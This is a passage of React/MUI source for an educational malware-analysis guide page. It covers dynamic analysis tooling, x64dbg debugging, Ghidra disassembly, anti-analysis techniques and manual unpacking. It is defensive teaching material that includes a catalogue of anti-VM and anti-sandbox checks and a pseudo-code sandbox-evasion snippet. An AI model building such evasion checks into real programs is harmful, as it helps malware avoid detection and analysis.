                  "Look for persistence mechanisms",
                ],
              },
              {
                name: "API Monitor / x64dbg",
                category: "API Tracing",
                color: "#ec4899",
                desc: "Intercept and log Windows API calls made by the malware",
                tips: [
                  "Focus on crypto, network, process APIs",
                  "Log parameters and return values",
                  "Trace through anti-analysis checks",
                  "Capture decrypted strings",
                ],
              },
              {
                name: "Autoruns",
                category: "Persistence",
                color: "#ef4444",
                desc: "Shows all auto-start locations in Windows",
                tips: [
                  "Compare before/after malware execution",
                  "Check services, scheduled tasks, Run keys",
                  "Look for unsigned entries",
                  "Verify digital signatures",
                ],
              },
            ].map((tool, idx) => (
              <Grid item xs={12} md={6} key={idx}>
                <Paper
                  sx={{
                    p: 2.5,
                    height: "100%",
                    borderRadius: 2,
                    bgcolor: alpha(tool.color, 0.03),
                    border: `1px solid ${alpha(tool.color, 0.15)}`,
                  }}
                >
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>{tool.name}</Typography>
                    <Chip label={tool.category} size="small" sx={{ fontSize: "0.6rem", bgcolor: alpha(tool.color, 0.15), color: tool.color }} />
                  </Box>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 1.5 }}>
                    {tool.desc}
                  </Typography>
                  <Typography variant="caption" sx={{ fontWeight: 600, display: "block", mb: 0.5 }}>Tips:</Typography>
                  <List dense sx={{ py: 0 }}>
                    {tool.tips.map((tip, i) => (
                      <ListItem key={i} sx={{ py: 0, pl: 1 }}>
                        <Typography variant="caption" color="text.secondary"> {tip}</Typography>
                      </ListItem>
                    ))}
                  </List>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>
            Dynamic Analysis Workflow
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Pre-Execution Checklist:
1.  VM snapshot taken (clean state)
2.  Network isolated (host-only) or monitored
3.  INetSim/FakeNet running (if simulating services)
4.  Wireshark capturing on correct interface
5.  ProcMon running with filters set
6.  Regshot "1st Shot" taken

# During Execution:
1. Execute malware (may need admin rights)
2. Wait 2-5 minutes for initial activity
3. Check for persistence (Autoruns)
4. Note any popups, behavior, errors
5. Trigger functionality (if banking trojan: visit fake bank site)

# Post-Execution:
1. Regshot "2nd Shot" + Compare
2. Stop Wireshark capture, save PCAP
3. Export ProcMon logs (CSV for analysis)
4. Screenshot Process Explorer tree
5. Document all findings
6. Revert VM to clean snapshot`}
            </Typography>
          </Paper>

          <Alert severity="warning" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Watch for Anti-Analysis</AlertTitle>
            <Typography variant="body2">
              Malware may detect your monitoring tools and refuse to run or change behavior. If you see the malware 
              exit immediately, try: renaming tools (procmon.exe  sysmon.exe), using kernel-mode monitoring, 
              or patching anti-VM checks. Some malware waits for user activity before executing (mouse movement, 
              key presses, time delays).
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 5: DEBUGGING MALWARE ==================== */}
        <Paper
          id="debugging-malware-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#ec4899", 0.02),
            border: `1px solid ${alpha("#ec4899", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#ec4899", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#ec4899",
              }}
            >
              <BugReportIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#ec4899" }}>
                5. Debugging Malware
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Debugging allows you to step through malware instruction by instruction, inspect memory and registers, 
            and understand exactly what the code does. This is essential for bypassing anti-analysis, unpacking, 
            and understanding complex logic that isn't clear from static analysis.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ec4899" }}>
            Popular Debuggers
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              {
                name: "x64dbg / x32dbg",
                platform: "Windows",
                pros: "Free, modern UI, active development, plugin ecosystem",
                cons: "Windows only",
                best: "General Windows malware analysis",
              },
              {
                name: "WinDbg",
                platform: "Windows",
                pros: "Kernel debugging, crash dump analysis, Microsoft official",
                cons: "Steep learning curve, complex UI",
                best: "Rootkits, kernel drivers, crash analysis",
              },
              {
                name: "OllyDbg",
                platform: "Windows (32-bit)",
                pros: "Classic, simple, good for learning",
                cons: "32-bit only, no longer updated",
                best: "Legacy malware, learning basics",
              },
              {
                name: "GDB",
                platform: "Linux/Cross",
                pros: "Powerful, scriptable, works with GEF/pwndbg",
                cons: "Command-line only, steep learning curve",
                best: "Linux malware, ELF analysis",
              },
            ].map((dbg, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#ec4899", 0.03), border: `1px solid ${alpha("#ec4899", 0.1)}` }}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>{dbg.name}</Typography>
                    <Chip label={dbg.platform} size="small" sx={{ fontSize: "0.6rem" }} />
                  </Box>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                    <strong>Pros:</strong> {dbg.pros}
                  </Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                    <strong>Cons:</strong> {dbg.cons}
                  </Typography>
                  <Typography variant="body2" sx={{ color: "#ec4899", fontWeight: 600 }}>
                    Best for: {dbg.best}
                  </Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ec4899" }}>
            Essential x64dbg Operations
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Basic Navigation
F7          Step into (follow CALLs)
F8          Step over (execute CALLs without entering)
F9          Run until breakpoint
Ctrl+F9     Run until return
F2          Toggle breakpoint at cursor
Ctrl+G      Go to address/expression

# Breakpoint Types
bp <address>           # Software breakpoint
bph <address>          # Hardware breakpoint (4 max, harder to detect)
bp kernel32.CreateFileA   # Break on API call
bc <address>           # Clear breakpoint

# Memory Operations
db <address>           # Dump bytes
dd <address>           # Dump DWORDs
Follow in Dump         # Right-click register/address

# Useful Breakpoints for Malware:
bp VirtualAlloc         # Memory allocation (unpacking)
bp VirtualProtect       # Memory protection changes
bp CreateRemoteThread   # Process injection
bp WriteProcessMemory   # Process memory writes
bp LoadLibraryA         # DLL loading
bp GetProcAddress       # API resolution (packed malware)
bp InternetOpenA        # Network activity
bp RegSetValueExA       # Registry persistence

# Finding OEP (Original Entry Point) of packed malware:
1. bp VirtualAlloc
2. Run until it returns
3. Follow allocated memory in dump
4. bp on that memory (hardware bp)
5. Continue until unpacked code executes there`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ec4899" }}>
            Bypassing Anti-Debugging
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              {
                technique: "IsDebuggerPresent",
                detection: "Checks PEB.BeingDebugged flag",
                bypass: "Patch return value to 0, or edit PEB.BeingDebugged",
              },
              {
                technique: "CheckRemoteDebuggerPresent",
                detection: "Checks for remote debugger attachment",
                bypass: "Hook API or patch call to return FALSE",
              },
              {
                technique: "NtQueryInformationProcess",
                detection: "ProcessDebugPort returns non-zero if debugged",
                bypass: "Hook and return 0 for debug queries",
              },
              {
                technique: "Timing Checks (RDTSC)",
                detection: "Measures execution time between instructions",
                bypass: "Patch out checks or use plugin to handle RDTSC",
              },
              {
                technique: "Hardware Breakpoint Detection",
                detection: "Reads debug registers (DR0-DR7)",
                bypass: "Use software breakpoints or patch check",
              },
              {
                technique: "INT 3 Scanning",
                detection: "Searches for 0xCC bytes (breakpoints) in memory",
                bypass: "Use hardware breakpoints instead",
              },
            ].map((item, idx) => (
              <Grid item xs={12} md={6} key={idx}>
                <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#ec4899", 0.03), border: `1px solid ${alpha("#ec4899", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ec4899" }}>{item.technique}</Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.8rem", mb: 0.5 }}>
                    <strong>How:</strong> {item.detection}
                  </Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem" }}>
                    <strong>Bypass:</strong> {item.bypass}
                  </Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="success" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>x64dbg Plugins for Malware Analysis</AlertTitle>
            <Typography variant="body2">
              <strong>ScyllaHide:</strong> Anti-anti-debugging plugin (hides debugger presence)<br />
              <strong>xAnalyzer:</strong> Automatic analysis of functions and API calls<br />
              <strong>OllyDumpEx:</strong> Dump unpacked processes from memory<br />
              <strong>Labeless:</strong> Sync with IDA Pro for combined static+dynamic analysis<br />
              <strong>SwissArmyKnife:</strong> Utilities for patching, searching, and more
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 6: DISASSEMBLY & CODE ANALYSIS ==================== */}
        <Paper
          id="disassembly-analysis-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#14b8a6", 0.02),
            border: `1px solid ${alpha("#14b8a6", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#14b8a6", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#14b8a6",
              }}
            >
              <CodeIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#14b8a6" }}>
                6. Disassembly & Code Analysis
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Disassemblers convert machine code back to assembly language, allowing you to understand the exact 
            operations malware performs. Combined with decompilers that produce pseudo-C code, you can reverse 
            engineer complex malware logic without needing to be an assembly expert.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#14b8a6" }}>
            Major Disassembly Tools
          </Typography>

          <Grid container spacing={3} sx={{ mb: 4 }}>
            {[
              {
                name: "Ghidra",
                company: "NSA (Free)",
                color: "#dc2626",
                features: ["Free & open-source", "Built-in decompiler", "Collaborative analysis", "Scripting (Java/Python)", "Excellent PE/ELF support"],
                strengths: "Best free option, great decompiler quality",
                learning: "Moderate - good documentation available",
              },
              {
                name: "IDA Pro",
                company: "Hex-Rays (Commercial)",
                color: "#6366f1",
                features: ["Industry standard", "Best decompiler (Hex-Rays)", "Huge plugin ecosystem", "FLIRT signatures", "Debugger integration"],
                strengths: "Most mature, best analysis quality",
                learning: "Steep - but most resources available",
              },
              {
                name: "Binary Ninja",
                company: "Vector 35 (Commercial)",
                color: "#f97316",
                features: ["Modern architecture", "Clean UI", "Fast analysis", "IL (BNIL) framework", "Good API for automation"],
                strengths: "Modern, fast, great for scripting",
                learning: "Moderate - very intuitive UI",
              },
              {
                name: "Cutter",
                company: "Rizin (Free)",
                color: "#10b981",
                features: ["Rizin/radare2 frontend", "Free & open-source", "Ghidra decompiler plugin", "Graph views", "Cross-platform"],
                strengths: "Free, combines best of radare2",
                learning: "Moderate - improving documentation",
              },
            ].map((tool, idx) => (
              <Grid item xs={12} md={6} key={idx}>
                <Paper
                  sx={{
                    p: 2.5,
                    height: "100%",
                    borderRadius: 2,
                    bgcolor: alpha(tool.color, 0.03),
                    border: `1px solid ${alpha(tool.color, 0.15)}`,
                  }}
                >
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1.5 }}>
                    <Typography variant="h6" sx={{ fontWeight: 700, color: tool.color }}>{tool.name}</Typography>
                    <Chip label={tool.company} size="small" sx={{ fontSize: "0.6rem" }} />
                  </Box>
                  <List dense sx={{ py: 0, mb: 1 }}>
                    {tool.features.map((f, i) => (
                      <ListItem key={i} sx={{ py: 0, pl: 0 }}>
                        <ListItemIcon sx={{ minWidth: 24 }}><CheckCircleIcon sx={{ fontSize: 14, color: "#22c55e" }} /></ListItemIcon>
                        <ListItemText primary={<Typography variant="body2">{f}</Typography>} />
                      </ListItem>
                    ))}
                  </List>
                  <Typography variant="body2" sx={{ mb: 0.5 }}><strong>Best for:</strong> {tool.strengths}</Typography>
                  <Typography variant="body2" color="text.secondary"><strong>Learning curve:</strong> {tool.learning}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#14b8a6" }}>
            Essential x86/x64 Assembly for Malware Analysis
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Registers (x64)
RAX, RBX, RCX, RDX   # General purpose (RCX/RDX = first args on Win64)
RSI, RDI            # Source/Destination (RDI/RSI = first args on Linux)
RSP                 # Stack pointer
RBP                 # Base pointer (stack frame)
RIP                 # Instruction pointer
R8-R15              # Additional general purpose (x64 only)

# Common Instructions
mov dst, src        # Copy value
lea dst, [addr]     # Load effective address (pointer math)
push/pop            # Stack operations
call <addr>         # Call function (pushes return address)
ret                 # Return from function
jmp <addr>          # Unconditional jump
jz/jnz/je/jne       # Conditional jumps (zero, equal, etc.)
cmp a, b            # Compare (sets flags)
test a, b           # Bitwise AND (sets flags, commonly test eax,eax)
xor eax, eax        # Zero a register (common pattern)

# Function Prologue/Epilogue (x64 Windows)
push rbp            ; Save old base pointer
mov rbp, rsp        ; Set up stack frame
sub rsp, 0x40       ; Allocate local variables
...
add rsp, 0x40       ; Clean up locals
pop rbp             ; Restore old base pointer
ret                 ; Return

# Calling Convention (x64 Windows)
RCX = arg1, RDX = arg2, R8 = arg3, R9 = arg4
RAX = return value
Stack used for args 5+

# Suspicious Patterns
xor ecx, ecx; mov cl, [esi+eax]; xor [edi+eax], cl  # XOR decryption loop
call $+5; pop eax                                    # Get current address (position-independent)
push <addr>; ret                                     # Return-based jump (ROP gadget style)`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#14b8a6" }}>
            Code Analysis Workflow in Ghidra
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { step: "1", title: "Create Project & Import", desc: "Create new project, import binary, let auto-analysis complete" },
              { step: "2", title: "Find Entry Points", desc: "Start at main/WinMain, or check exports/entry point in PE headers" },
              { step: "3", title: "Rename Functions", desc: "As you identify functions, rename them (F2) for clarity" },
              { step: "4", title: "Add Comments", desc: "Document what code does with ; comments and plate comments" },
              { step: "5", title: "Cross-References", desc: "Use X key to find where functions/strings are called from" },
              { step: "6", title: "Define Data Types", desc: "Create structures for complex data, apply to variables" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#14b8a6", 0.03), border: `1px solid ${alpha("#14b8a6", 0.1)}` }}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    <Chip label={item.step} size="small" sx={{ bgcolor: "#14b8a6", color: "white", fontWeight: 700 }} />
                    <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.title}</Typography>
                  </Box>
                  <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Ghidra Keyboard Shortcuts</AlertTitle>
            <Typography variant="body2">
              <strong>G:</strong> Go to address | <strong>X:</strong> Show cross-references | <strong>L:</strong> Rename label<br />
              <strong>Ctrl+E:</strong> Edit bytes | <strong>D:</strong> Disassemble | <strong>C:</strong> Clear code<br />
              <strong>T:</strong> Set data type | <strong>;:</strong> Set comment | <strong>Ctrl+Shift+E:</strong> Export program
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 7: ANTI-ANALYSIS TECHNIQUES ==================== */}
        <Paper
          id="anti-analysis-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#f97316", 0.02),
            border: `1px solid ${alpha("#f97316", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#f97316", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#f97316",
              }}
            >
              <ShieldIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#f97316" }}>
                7. Anti-Analysis Techniques
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Malware authors employ various techniques to prevent or slow down analysis. Understanding these 
            techniques helps you recognize when they're being used and know how to bypass them. Most modern 
            malware uses multiple anti-analysis methods in combination.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f97316" }}>
            Anti-Virtual Machine Detection
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              {
                name: "Registry Keys",
                check: "HKLM\\SOFTWARE\\VMware, VirtualBox Guest Additions",
                bypass: "Delete/rename VM-related registry keys",
              },
              {
                name: "Process Names",
                check: "vmtoolsd.exe, VBoxService.exe, qemu-ga.exe",
                bypass: "Rename VM tools processes or terminate them",
              },
              {
                name: "MAC Address",
                check: "VMware: 00:0C:29, 00:50:56; VBox: 08:00:27",
                bypass: "Change VM MAC address to random vendor",
              },
              {
                name: "Hardware IDs",
                check: "BIOS strings, disk names containing VBOX/VMWARE",
                bypass: "Modify VM configuration to use generic names",
              },
              {
                name: "CPUID Instruction",
                check: "Hypervisor brand string, hypervisor present bit",
                bypass: "VmwareHardenedLoader, pafish bypass scripts",
              },
              {
                name: "Timing Attacks",
                check: "RDTSC differences, VM exits cause timing gaps",
                bypass: "TSC offsetting in VMware, or patch checks",
              },
              {
                name: "File System",
                check: "C:\\Windows\\System32\\drivers\\vmmouse.sys",
                bypass: "Remove/rename VM-specific drivers",
              },
              {
                name: "Screen Resolution",
                check: "Unusual resolutions like 800x600, 1024x768",
                bypass: "Set realistic resolution (1920x1080, etc.)",
              },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#f97316", 0.03), border: `1px solid ${alpha("#f97316", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f97316", mb: 0.5 }}>{item.name}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem", mb: 0.5 }}>
                    <strong>Check:</strong> {item.check}
                  </Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.8rem" }}>
                    <strong>Bypass:</strong> {item.bypass}
                  </Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f97316" }}>
            Anti-Sandbox Detection
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Common Sandbox Evasion Techniques

## Environment Checks
- Username: Check for "sandbox", "malware", "virus", "sample", "test"
- Computername: Generic names like WIN-XXXXXXXX, SANDBOX, DESKTOP-XXXXXX
- Domain: Not joined to domain = possibly sandbox
- Recent files: Empty Recent folder = fresh VM
- Browser history: No history = sandbox

## Hardware Checks  
- RAM: Less than 4GB = likely sandbox
- CPU cores: Single core = sandbox (most real PCs have 2+)
- Disk size: Less than 60GB = sandbox
- Screen resolution: 800x600 or similar = sandbox

## Behavioral Checks
- Mouse movement: No movement over time = no real user
- User interaction: Wait for clicks, scrolling, typing
- Time-based: Sleep for extended periods, check if time was accelerated
- File execution count: Execute only after X runs

## Network Checks
- Internet connectivity: Many sandboxes are isolated
- DNS response: Check for known sandbox DNS servers
- Geolocation: IP from security company range

# Example: Mouse movement check (pseudo-code)
POINT p1, p2;
GetCursorPos(&p1);
Sleep(3000);
GetCursorPos(&p2);
if (p1.x == p2.x && p1.y == p2.y) {
    // No mouse movement - might be sandbox
    ExitProcess(0);
}`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f97316" }}>
            Code Obfuscation Techniques
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { name: "Dead Code Insertion", desc: "Add meaningless instructions that don't affect execution", impact: "Bloats code, confuses analysis" },
              { name: "Instruction Substitution", desc: "Replace simple instructions with equivalent complex ones", impact: "mov eax,0  xor eax,eax or sub eax,eax" },
              { name: "Control Flow Flattening", desc: "Replace normal flow with state machine in switch", impact: "Makes CFG analysis extremely difficult" },
              { name: "Opaque Predicates", desc: "Conditional jumps that always go one way", impact: "Creates fake branches, confuses static analysis" },
              { name: "String Encryption", desc: "Encrypt strings, decrypt at runtime", impact: "Hides URLs, commands, API names from static analysis" },
              { name: "API Hashing", desc: "Resolve APIs by hash instead of name", impact: "No readable import names in binary" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#f97316", 0.03), border: `1px solid ${alpha("#f97316", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 0.5 }}>{item.name}</Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.8rem", mb: 0.5 }}>{item.desc}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem", color: "#f97316" }}><strong>Effect:</strong> {item.impact}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="warning" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Tools to Counter Anti-Analysis</AlertTitle>
            <Typography variant="body2">
              <strong>VMware Hardened:</strong> VMwareHardenedLoader - patches VM artifacts<br />
              <strong>al-khaser:</strong> POC tool to test anti-analysis, great for understanding techniques<br />
              <strong>pafish:</strong> Paranoid Fish - tests for VM/sandbox detection<br />
              <strong>Unprotect Project:</strong> Database of anti-analysis techniques and bypasses
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 8: UNPACKING & DEOBFUSCATION ==================== */}
        <Paper
          id="unpacking-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#6366f1", 0.02),
            border: `1px solid ${alpha("#6366f1", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#6366f1", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#6366f1",
              }}
            >
              <LockIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#6366f1" }}>
                8. Unpacking & Deobfuscation
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Most malware is packed or crypted to evade detection and make analysis harder. Unpacking 
            involves extracting the original code from its compressed/encrypted wrapper. This is often 
            the first major hurdle in malware analysis.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#6366f1" }}>
            Common Packers & Identifiers
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { name: "UPX", indicator: "UPX0, UPX1 sections", difficulty: "Easy", unpack: "upx -d file.exe (built-in unpacker)" },
              { name: "ASPack", indicator: ".aspack section", difficulty: "Medium", unpack: "AspackDie or manual OEP finding" },
              { name: "Themida/WinLicense", indicator: "High entropy, VM-based protection", difficulty: "Very Hard", unpack: "Requires VM handler analysis, x64dbg scripts" },
              { name: "VMProtect", indicator: "Virtual machine-based obfuscation", difficulty: "Very Hard", unpack: "Devirtualization tools, significant effort" },
              { name: "PECompact", indicator: "PEC2 section", difficulty: "Medium", unpack: "Manual or dedicated tools" },
              { name: "NSPack", indicator: ".nsp sections", difficulty: "Medium", unpack: "Manual unpacking" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#6366f1", 0.03), border: `1px solid ${alpha("#6366f1", 0.1)}` }}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#6366f1" }}>{item.name}</Typography>
                    <Chip 
                      label={item.difficulty} 
                      size="small" 
                      sx={{ 
                        fontSize: "0.6rem",
                        bgcolor: item.difficulty === "Easy" ? alpha("#22c55e", 0.15) : 
                                item.difficulty === "Medium" ? alpha("#f59e0b", 0.15) : alpha("#ef4444", 0.15),
                        color: item.difficulty === "Easy" ? "#22c55e" : 
                              item.difficulty === "Medium" ? "#f59e0b" : "#ef4444",
                      }} 
                    />
                  </Box>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem", mb: 0.5 }}><strong>Indicator:</strong> {item.indicator}</Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.8rem" }}><strong>Unpack:</strong> {item.unpack}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#6366f1" }}>
            Manual Unpacking Workflow
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Generic Manual Unpacking Steps (x64dbg)

## Step 1: Find OEP (Original Entry Point)
# Packers decompress code then jump to original entry point

# Method A: Tail Jump (most common)
1. Run to entry point of packed executable
2. Look for unpacking loop (XOR/ADD operations, REP instructions)
3. Find the final JMP after unpacking (often JMP EAX/JMP [reg])
4. Set breakpoint, run, you're at OEP

# Method B: ESP Trick
1. At entry point, note ESP value
2. Set hardware breakpoint on that stack location (on access)
3. Run - will break when unpacker restores original ESP
4. Step through to find OEP jump

# Method C: Memory Breakpoint
1. bp VirtualAlloc / VirtualProtect
2. Run - note addresses of allocated RWX memory
3. Set memory breakpoint on execute for that region
4. Run - breaks when code in new region executes

## Step 2: Dump Process
# Once at OEP, dump the unpacked code from memory

# Using Scylla (integrated in x64dbg):
1. Plugins  Scylla
2. Click "IAT Autosearch"  
3. Click "Get Imports"
4. Fix any invalid imports manually
5. Click "Dump" to save unpacked PE
6. Click "Fix Dump" to rebuild import table

## Step 3: Verify & Clean
1. Open dumped file in PE editor (CFF Explorer)
2. Fix section permissions if needed
3. Test if unpacked binary runs
4. Analyze in Ghidra/IDA`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#6366f1" }}>
            IAT Reconstruction
          </Typography>

          <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
            After dumping, the Import Address Table (IAT) often needs fixing because API addresses 
            point to the packer's stubs or are resolved dynamically. Tools help rebuild the IAT:
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { name: "Scylla", desc: "Best IAT rebuilder, integrated in x64dbg. Auto-search, manual fixing." },
              { name: "ImpRec", desc: "Classic tool, still works for many packers. Good tracing support." },
              { name: "CHimpREC", desc: "Chinese ImpRec variant with additional features." },
              { name: "PE-sieve", desc: "Scans for hooks and dumps with reconstructed imports." },
            ].map((tool, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#6366f1", 0.03), border: `1px solid ${alpha("#6366f1", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{tool.name}</Typography>
                  <Typography variant="body2" color="text.secondary">{tool.desc}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>String Decryption Tips</AlertTitle>
            <Typography variant="body2">
